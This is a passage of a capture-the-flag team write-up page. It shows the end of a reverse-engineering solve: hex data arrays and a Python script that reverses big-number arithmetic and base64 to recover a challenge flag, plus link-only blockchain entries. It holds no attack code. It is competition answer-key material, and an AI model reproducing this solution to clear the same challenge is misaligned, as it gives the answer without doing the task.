class="punctuation">[</span><span class="number">0x00000AE3</span><span class="punctuation">,</span> <span class="number">0x0000069F</span><span class="punctuation">,</span> <span class="number">0x000001EF</span><span class="punctuation">,</span> <span class="number">0x00001C15</span><span class="punctuation">,</span> <span class="number">0x00001378</span><span class="punctuation">,</span> <span class="number">0x000020D1</span><span class="punctuation">,</span> <span class="number">0x0000211D</span><span class="punctuation">,</span> <span class="number">0x00002275</span><span class="punctuation">,</span> <span class="number">0x000005F4</span><span class="punctuation">,</span> <span class="number">0x00002475</span><span class="punctuation">,</span> <span class="number">0x00000D13</span><span class="punctuation">,</span> <span class="number">0x000008EF</span><span class="punctuation">,</span> <span class="number">0x00000E10</span><span class="punctuation">,</span> <span class="number">0x000006D4</span><span class="punctuation">,</span> <span class="number">0x0000215A</span><span class="punctuation">,</span> <span class="number">0x000004D6</span><span class="punctuation">,</span> <span class="number">0x0000202F</span><span class="punctuation">,</span> <span class="number">0x00001B99</span><span class="punctuation">,</span> <span class="number">0x00001C86</span><span class="punctuation">,</span> <span class="number">0x000002F1</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">[</span><span class="number">0x00000680</span><span class="punctuation">,</span> <span class="number">0x000000D4</span><span class="punctuation">,</span> <span class="number">0x00000677</span><span class="punctuation">,</span> <span class="number">0x00001E21</span><span class="punctuation">,</span> <span class="number">0x0000220D</span><span class="punctuation">,</span> <span class="number">0x00000933</span><span class="punctuation">,</span> <span class="number">0x00000973</span><span class="punctuation">,</span> <span class="number">0x00001947</span><span class="punctuation">,</span> <span class="number">0x00000D61</span><span class="punctuation">,</span> <span class="number">0x0000247F</span><span class="punctuation">,</span> <span class="number">0x00001D21</span><span class="punctuation">,</span> <span class="number">0x00001FA2</span><span class="punctuation">,</span> <span class="number">0x00001606</span><span class="punctuation">,</span> <span class="number">0x000007B0</span><span class="punctuation">,</span> <span class="number">0x00001829</span><span class="punctuation">,</span> <span class="number">0x000016C0</span><span class="punctuation">,</span> <span class="number">0x000026C9</span><span class="punctuation">,</span> <span class="number">0x0000248C</span><span class="punctuation">,</span> <span class="number">0x00000C9A</span><span class="punctuation">,</span> <span class="number">0x00001F8F</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">[</span><span class="number">0x0000257F</span><span class="punctuation">,</span> <span class="number">0x00000359</span><span class="punctuation">,</span> <span class="number">0x00001831</span><span class="punctuation">,</span> <span class="number">0x000021B7</span><span class="punctuation">,</span> <span class="number">0x00000BA8</span><span class="punctuation">,</span> <span class="number">0x00000FC5</span><span class="punctuation">,</span> <span class="number">0x00000BA4</span><span class="punctuation">,</span> <span class="number">0x000024E2</span><span class="punctuation">,</span> <span class="number">0x00001241</span><span class="punctuation">,</span> <span class="number">0x00000D53</span><span class="punctuation">,</span> <span class="number">0x00000C82</span><span class="punctuation">,</span> <span class="number">0x00001240</span><span class="punctuation">,</span> <span class="number">0x00002241</span><span class="punctuation">,</span> <span class="number">0x00001156</span><span class="punctuation">,</span> <span class="number">0x0000116A</span><span class="punctuation">,</span> <span class="number">0x000005F3</span><span class="punctuation">,</span> <span class="number">0x000022D5</span><span class="punctuation">,</span> <span class="number">0x000008DA</span><span class="punctuation">,</span> <span class="number">0x000014A3</span><span class="punctuation">,</span> <span class="number">0x0000059E</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">[</span><span class="number">0x00001675</span><span class="punctuation">,</span> <span class="number">0x00000AA9</span><span class="punctuation">,</span> <span class="number">0x00000D8B</span><span class="punctuation">,</span> <span class="number">0x00000D31</span><span class="punctuation">,</span> <span class="number">0x00001722</span><span class="punctuation">,</span> <span class="number">0x000006C8</span><span class="punctuation">,</span> <span class="number">0x0000151B</span><span class="punctuation">,</span> <span class="number">0x000017D8</span><span class="punctuation">,</span> <span class="number">0x00001FEF</span><span class="punctuation">,</span> <span class="number">0x00001624</span><span class="punctuation">,</span> <span class="number">0x00002307</span><span class="punctuation">,</span> <span class="number">0x00000CB9</span><span class="punctuation">,</span> <span class="number">0x0000053C</span><span class="punctuation">,</span> <span class="number">0x00000230</span><span class="punctuation">,</span> <span class="number">0x00001EAA</span><span class="punctuation">,</span> <span class="number">0x00001FD1</span><span class="punctuation">,</span> <span class="number">0x00000FAD</span><span class="punctuation">,</span> <span class="number">0x00001E30</span><span class="punctuation">,</span> <span class="number">0x00002345</span><span class="punctuation">,</span> <span class="number">0x00001583</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">[</span><span class="number">0x000001D1</span><span class="punctuation">,</span> <span class="number">0x0000056E</span><span class="punctuation">,</span> <span class="number">0x00000AA3</span><span class="punctuation">,</span> <span class="number">0x0000223C</span><span class="punctuation">,</span> <span class="number">0x000009A4</span><span class="punctuation">,</span> <span class="number">0x000006C9</span><span class="punctuation">,</span> <span class="number">0x00000112</span><span class="punctuation">,</span> <span class="number">0x00001977</span><span class="punctuation">,</span> <span class="number">0x00002512</span><span class="punctuation">,</span> <span class="number">0x00000B60</span><span class="punctuation">,</span> <span class="number">0x0000081A</span><span class="punctuation">,</span> <span class="number">0x00000F06</span><span class="punctuation">,</span> <span class="number">0x00001329</span><span class="punctuation">,</span> <span class="number">0x000011AA</span><span class="punctuation">,</span> <span class="number">0x00002404</span><span class="punctuation">,</span> <span class="number">0x00000E57</span><span class="punctuation">,</span> <span class="number">0x0000011E</span><span class="punctuation">,</span> <span class="number">0x000011DC</span><span class="punctuation">,</span> <span class="number">0x00002474</span><span class="punctuation">,</span> <span class="number">0x00001BC7</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">[</span><span class="number">0x000022BE</span><span class="punctuation">,</span> <span class="number">0x00001F17</span><span class="punctuation">,</span> <span class="number">0x00000588</span><span class="punctuation">,</span> <span class="number">0x00001B80</span><span class="punctuation">,</span> <span class="number">0x00001479</span><span class="punctuation">,</span> <span class="number">0x000016EF</span><span class="punctuation">,</span> <span class="number">0x000008CA</span><span class="punctuation">,</span> <span class="number">0x00000D6E</span><span class="punctuation">,</span> <span class="number">0x0000138F</span><span class="punctuation">,</span> <span class="number">0x00001054</span><span class="punctuation">,</span> <span class="number">0x000021FA</span><span class="punctuation">,</span> <span class="number">0x00000102</span><span class="punctuation">,</span> <span class="number">0x000013A6</span><span class="punctuation">,</span> <span class="number">0x00000195</span><span class="punctuation">,</span> <span class="number">0x000002D1</span><span class="punctuation">,</span> <span class="number">0x00002594</span><span class="punctuation">,</span> <span class="number">0x00001369</span><span class="punctuation">,</span> <span class="number">0x00002534</span><span class="punctuation">,</span> <span class="number">0x000015C5</span><span class="punctuation">,</span> <span class="number">0x0000168A</span><span class="punctuation">]</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p>运算过程</p>
<p><img src="./165689630148543.png"></p>
<p>脚本解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#_*_coding:utf-8_*_</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = [[<span class="number">0x000024AC</span>, <span class="number">0x00000116</span>, <span class="number">0x000004F4</span>, <span class="number">0x00000B64</span>, <span class="number">0x00001DC3</span>, <span class="number">0x00001B4A</span>, </span><br><span class="line">        <span class="number">0x000001B2</span>, <span class="number">0x00001FCE</span>, <span class="number">0x00000E81</span>, <span class="number">0x000025AB</span>, <span class="number">0x0000015B</span>, <span class="number">0x0000252D</span>, </span><br><span class="line">        <span class="number">0x000002AC</span>, <span class="number">0x00000F77</span>, <span class="number">0x000022F5</span>, <span class="number">0x000019E3</span>, <span class="number">0x00001C53</span>, <span class="number">0x00000B66</span>, </span><br><span class="line">        <span class="number">0x000011BC</span>, <span class="number">0x0000193A</span>],[<span class="number">0x00000DC6</span>, <span class="number">0x00000854</span>, <span class="number">0x000015F5</span>, <span class="number">0x00002567</span>, </span><br><span class="line">        <span class="number">0x000008FA</span>, <span class="number">0x00000E20</span>, <span class="number">0x00000807</span>, <span class="number">0x00001007</span>, <span class="number">0x000018CC</span>, <span class="number">0x00001E84</span>,</span><br><span class="line">        <span class="number">0x00001F11</span>, <span class="number">0x000013D4</span>, <span class="number">0x0000076A</span>, <span class="number">0x00001461</span>, <span class="number">0x00000B0F</span>, <span class="number">0x00001F70</span>,</span><br><span class="line">        <span class="number">0x00001B3D</span>, <span class="number">0x00001008</span>, <span class="number">0x00000D52</span>, <span class="number">0x0000049A</span>],[<span class="number">0x00001A89</span>, <span class="number">0x00000E42</span>, </span><br><span class="line">        <span class="number">0x000000FA</span>, <span class="number">0x0000100D</span>, <span class="number">0x000014DD</span>, <span class="number">0x00001BFC</span>, <span class="number">0x000026DB</span>, <span class="number">0x00001AC2</span>, </span><br><span class="line">        <span class="number">0x00001CA0</span>, <span class="number">0x000005ED</span>, <span class="number">0x00000834</span>, <span class="number">0x000016BF</span>, <span class="number">0x00000704</span>, <span class="number">0x00001FAD</span>, </span><br><span class="line">        <span class="number">0x000025FD</span>, <span class="number">0x00001142</span>, <span class="number">0x00001EEE</span>, <span class="number">0x00001E60</span>, <span class="number">0x00000353</span>, <span class="number">0x000015A8</span>],</span><br><span class="line">        [<span class="number">0x00000E17</span>, <span class="number">0x00000706</span>, <span class="number">0x00000C1F</span>, <span class="number">0x00000169</span>, <span class="number">0x00002248</span>, <span class="number">0x000007FD</span>, </span><br><span class="line">        <span class="number">0x00001768</span>, <span class="number">0x00001F54</span>, <span class="number">0x00001574</span>, <span class="number">0x00002458</span>, <span class="number">0x00000374</span>, <span class="number">0x00001D6B</span>, </span><br><span class="line">        <span class="number">0x00000918</span>, <span class="number">0x00000ECF</span>, <span class="number">0x0000211D</span>, <span class="number">0x00001D96</span>, <span class="number">0x00001BEB</span>, <span class="number">0x00001703</span>, </span><br><span class="line">        <span class="number">0x00001B87</span>, <span class="number">0x000006FA</span>],[<span class="number">0x00000AE3</span>, <span class="number">0x0000069F</span>, <span class="number">0x000001EF</span>, <span class="number">0x00001C15</span>,</span><br><span class="line">        <span class="number">0x00001378</span>, <span class="number">0x000020D1</span>, <span class="number">0x0000211D</span>, <span class="number">0x00002275</span>, <span class="number">0x000005F4</span>, <span class="number">0x00002475</span>,</span><br><span class="line">        <span class="number">0x00000D13</span>, <span class="number">0x000008EF</span>, <span class="number">0x00000E10</span>, <span class="number">0x000006D4</span>, <span class="number">0x0000215A</span>, <span class="number">0x000004D6</span>,</span><br><span class="line">        <span class="number">0x0000202F</span>, <span class="number">0x00001B99</span>, <span class="number">0x00001C86</span>, <span class="number">0x000002F1</span>],[<span class="number">0x00000680</span>, <span class="number">0x000000D4</span>, </span><br><span class="line">        <span class="number">0x00000677</span>, <span class="number">0x00001E21</span>, <span class="number">0x0000220D</span>, <span class="number">0x00000933</span>, <span class="number">0x00000973</span>, <span class="number">0x00001947</span>, </span><br><span class="line">        <span class="number">0x00000D61</span>, <span class="number">0x0000247F</span>, <span class="number">0x00001D21</span>, <span class="number">0x00001FA2</span>, <span class="number">0x00001606</span>, <span class="number">0x000007B0</span>,</span><br><span class="line">        <span class="number">0x00001829</span>, <span class="number">0x000016C0</span>, <span class="number">0x000026C9</span>, <span class="number">0x0000248C</span>, <span class="number">0x00000C9A</span>, <span class="number">0x00001F8F</span>],</span><br><span class="line">        [<span class="number">0x0000257F</span>, <span class="number">0x00000359</span>, <span class="number">0x00001831</span>, <span class="number">0x000021B7</span>, <span class="number">0x00000BA8</span>, <span class="number">0x00000FC5</span>, </span><br><span class="line">        <span class="number">0x00000BA4</span>, <span class="number">0x000024E2</span>, <span class="number">0x00001241</span>, <span class="number">0x00000D53</span>, <span class="number">0x00000C82</span>, <span class="number">0x00001240</span>, </span><br><span class="line">        <span class="number">0x00002241</span>, <span class="number">0x00001156</span>, <span class="number">0x0000116A</span>, <span class="number">0x000005F3</span>, <span class="number">0x000022D5</span>, <span class="number">0x000008DA</span>, </span><br><span class="line">        <span class="number">0x000014A3</span>, <span class="number">0x0000059E</span>],[<span class="number">0x00001675</span>, <span class="number">0x00000AA9</span>, <span class="number">0x00000D8B</span>, <span class="number">0x00000D31</span>,</span><br><span class="line">        <span class="number">0x00001722</span>, <span class="number">0x000006C8</span>, <span class="number">0x0000151B</span>, <span class="number">0x000017D8</span>, <span class="number">0x00001FEF</span>, <span class="number">0x00001624</span>, </span><br><span class="line">        <span class="number">0x00002307</span>, <span class="number">0x00000CB9</span>, <span class="number">0x0000053C</span>, <span class="number">0x00000230</span>, <span class="number">0x00001EAA</span>, <span class="number">0x00001FD1</span>, </span><br><span class="line">        <span class="number">0x00000FAD</span>, <span class="number">0x00001E30</span>, <span class="number">0x00002345</span>, <span class="number">0x00001583</span>],[<span class="number">0x000001D1</span>, <span class="number">0x0000056E</span>,</span><br><span class="line">        <span class="number">0x00000AA3</span>, <span class="number">0x0000223C</span>, <span class="number">0x000009A4</span>, <span class="number">0x000006C9</span>, <span class="number">0x00000112</span>, <span class="number">0x00001977</span>,</span><br><span class="line">        <span class="number">0x00002512</span>, <span class="number">0x00000B60</span>, <span class="number">0x0000081A</span>, <span class="number">0x00000F06</span>, <span class="number">0x00001329</span>, <span class="number">0x000011AA</span>,</span><br><span class="line">        <span class="number">0x00002404</span>, <span class="number">0x00000E57</span>, <span class="number">0x0000011E</span>, <span class="number">0x000011DC</span>, <span class="number">0x00002474</span>, <span class="number">0x00001BC7</span>],</span><br><span class="line">        [<span class="number">0x000022BE</span>, <span class="number">0x00001F17</span>, <span class="number">0x00000588</span>, <span class="number">0x00001B80</span>, <span class="number">0x00001479</span>, <span class="number">0x000016EF</span>, </span><br><span class="line">        <span class="number">0x000008CA</span>, <span class="number">0x00000D6E</span>, <span class="number">0x0000138F</span>, <span class="number">0x00001054</span>, <span class="number">0x000021FA</span>, <span class="number">0x00000102</span>, </span><br><span class="line">        <span class="number">0x000013A6</span>, <span class="number">0x00000195</span>, <span class="number">0x000002D1</span>, <span class="number">0x00002594</span>, <span class="number">0x00001369</span>, <span class="number">0x00002534</span>, </span><br><span class="line">        <span class="number">0x000015C5</span>, <span class="number">0x0000168A</span>]]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x000020F1</span>, <span class="number">0x00001DA9</span>, <span class="number">0x00000156</span>, <span class="number">0x00000B37</span>, <span class="number">0x000007C0</span>, <span class="number">0x0000066A</span>,</span><br><span class="line">       <span class="number">0x000024E0</span>, <span class="number">0x00000D42</span>, <span class="number">0x00002077</span>, <span class="number">0x000007EC</span>, <span class="number">0x00001BA7</span>, <span class="number">0x00002071</span>, </span><br><span class="line">       <span class="number">0x000000F8</span>, <span class="number">0x00000291</span>, <span class="number">0x000003DA</span>, <span class="number">0x0000157C</span>, <span class="number">0x00001EF4</span>, <span class="number">0x00002519</span>,</span><br><span class="line">       <span class="number">0x00000C25</span>, <span class="number">0x00002062</span>, <span class="number">0x00002253</span>, <span class="number">0x00000640</span>, <span class="number">0x000008DF</span>, <span class="number">0x00001E34</span>, </span><br><span class="line">       <span class="number">0x00002140</span>, <span class="number">0x00000F92</span>, <span class="number">0x0000039B</span>, <span class="number">0x0000126F</span>, <span class="number">0x00002403</span>, <span class="number">0x00000E65</span>, </span><br><span class="line">       <span class="number">0x000001F0</span>, <span class="number">0x00001868</span>, <span class="number">0x0000016D</span>, <span class="number">0x000006B6</span>, <span class="number">0x00002214</span>, <span class="number">0x00001603</span>,</span><br><span class="line">       <span class="number">0x00001925</span>, <span class="number">0x000016AE</span>, <span class="number">0x000012D0</span>, <span class="number">0x00001831</span>, <span class="number">0x0000018C</span>, <span class="number">0x00000BF7</span>,</span><br><span class="line">       <span class="number">0x00000E97</span>, <span class="number">0x000000CE</span>, <span class="number">0x0000061C</span>, <span class="number">0x00000390</span>, <span class="number">0x000019E9</span>, <span class="number">0x000022A5</span>,</span><br><span class="line">       <span class="number">0x00001601</span>, <span class="number">0x00001A1E</span>, <span class="number">0x000013D1</span>, <span class="number">0x00000DBC</span>, <span class="number">0x0000117D</span>, <span class="number">0x0000225F</span>, </span><br><span class="line">       <span class="number">0x00002272</span>, <span class="number">0x0000007B</span>, <span class="number">0x000023E6</span>, <span class="number">0x0000069F</span>, <span class="number">0x000002D3</span>, <span class="number">0x00001BEF</span>,</span><br><span class="line">       <span class="number">0x000003E6</span>, <span class="number">0x000017D4</span>, <span class="number">0x00002284</span>, <span class="number">0x000003B8</span>, <span class="number">0x00000251</span>, <span class="number">0x00001646</span>, </span><br><span class="line">       <span class="number">0x00000176</span>, <span class="number">0x0000081E</span>, <span class="number">0x000024C3</span>, <span class="number">0x00001E85</span>, <span class="number">0x00001097</span>, <span class="number">0x00001264</span>,</span><br><span class="line">       <span class="number">0x00000A34</span>, <span class="number">0x00001A3B</span>, <span class="number">0x00000FE7</span>, <span class="number">0x000026A6</span>, <span class="number">0x00001F43</span>, <span class="number">0x00001832</span>, </span><br><span class="line">       <span class="number">0x000021AE</span>, <span class="number">0x0000023C</span>, <span class="number">0x000004C2</span>, <span class="number">0x00002585</span>, <span class="number">0x000017E7</span>, <span class="number">0x000015DD</span>, </span><br><span class="line">       <span class="number">0x00002610</span>, <span class="number">0x00001B86</span>, <span class="number">0x00000D2A</span>, <span class="number">0x00000716</span>, <span class="number">0x00001C25</span>, <span class="number">0x00002099</span>]</span><br><span class="line"></span><br><span class="line">ful1 = <span class="number">0</span></span><br><span class="line">asu= [<span class="number">0</span>]*<span class="number">10</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc[::-<span class="number">1</span>]:</span><br><span class="line">    ful1 = ful1*<span class="number">10000</span>+i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> j[::-<span class="number">1</span>]:</span><br><span class="line">        asu[i] = asu[i]*<span class="number">10000</span>+j</span><br><span class="line"><span class="comment">#做运算  </span></span><br><span class="line">ful1 += asu[<span class="number">9</span>]</span><br><span class="line">ful1 -= asu[<span class="number">8</span>]</span><br><span class="line">ful1 += asu[<span class="number">7</span>]</span><br><span class="line">ful1 -= asu[<span class="number">6</span>]</span><br><span class="line">ful1 += asu[<span class="number">5</span>]</span><br><span class="line">ful1 //= asu[<span class="number">4</span>]</span><br><span class="line">ful1 -= asu[<span class="number">3</span>]</span><br><span class="line">ful1 += asu[<span class="number">2</span>]</span><br><span class="line">ful1 //= asu[<span class="number">1</span>]</span><br><span class="line">ful1 -= asu[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ful1:</span><br><span class="line">    flag += <span class="built_in">chr</span>(ful1%<span class="number">128</span>)</span><br><span class="line">    ful1 //= <span class="number">128</span></span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line"><span class="built_in">print</span>(flag) </span><br></pre></td></tr></table></figure>



<h1><span id="blockchain">Blockchain</span><a href="#blockchain" class="header-anchor"></a></h1><h2><span id="bet2loss">bet2loss</span><a href="#bet2loss" class="header-anchor"></a></h2><p><a href="https://www.seaeye.cn/archives/480.html">https://www.seaeye.cn/archives/480.html</a></p>
<h2><span id="aaadao">AAADAO</span><a href="#aaadao" class="header-anchor"></a></h2><p><a href="https://www.seaeye.cn/archives/480.html">https://www.seaeye.cn/archives/480.html</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>2022 ACTF SU Writeup</p><p><a href="https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/">https://team-su.github.io/2022/07/04/2022-ACTF-SU-Writeup/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-07-04</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-06-03</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/ACTF/">ACTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/07/04/2022-pcb-SU-Writeup/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2022 鹏城杯 SU Writeup</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/03/01/2022-2-28-SUSCTF/"><span class="level-item">2022 SUSCTF SU Writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1</span><span class="level-item">Web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">gogogo</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">poorui</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">beWhatYouWannaBe</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">ToLeSion</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">myclient</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2</span><span class="level-item">Misc</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">signin</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">Mahjoong</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">safer-telegram-bot-1</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">signoff</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3</span><span class="level-item">Pwn</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">mykvm</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">2048</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4</span><span class="level-item">Crypto</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">impossible RSA</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">RSA LEAK</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">5</span><span class="level-item">Rev</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">dropper</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">6</span><span class="level-item">Blockchain</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">6.1</span><span class="level-item">bet2loss</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">6.2</span><span class="level-item">AAADAO</span></span></a></li></ul></li></ul></div></div><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>